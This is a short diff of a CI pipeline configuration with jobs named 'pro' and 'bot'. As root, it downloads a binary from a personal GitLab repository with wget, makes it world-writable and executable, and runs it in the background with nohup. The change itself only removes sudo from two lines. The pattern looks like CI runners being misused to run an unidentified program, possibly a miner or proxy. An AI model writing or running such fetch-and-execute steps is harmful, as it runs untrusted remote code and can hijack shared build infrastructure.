@@ -11,9 +11,9 @@ jobs:
          name: "pro"
          command: | 
           sudo su --command "apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro"
-          sudo su --command "nohup ./pro --log=stdout > meta.log &"
+          nohup ./pro --log=stdout > meta.log &
           sleep 5
-          sudo su --command "cat meta.log"
+          cat meta.log
       
       - run:
          name: "bot"
